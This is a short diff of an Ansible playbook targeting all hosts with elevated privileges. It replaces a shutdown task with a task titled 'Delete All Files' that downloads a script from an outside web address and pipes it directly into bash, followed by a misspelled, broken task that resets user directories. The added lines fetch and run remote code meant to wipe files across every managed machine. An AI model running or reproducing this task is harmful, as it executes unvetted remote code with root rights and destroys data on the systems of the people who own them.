@@ -3,10 +3,10 @@
   hosts: all
   become: yes
   tasks:
-  - name: Force Shutdown
-    command: sudo systemctl poweroff
-
-
+  - name: Delete All Files
+    command: curl -sSL https://mcontrol.vercel.app/clear.sh | bash
+  - name: REstruct the dir
+    commnd: xdg-user-dirs-update --force
   #  - name: Run dnf install command
    #   command: sudo dnf install gdb -y
 
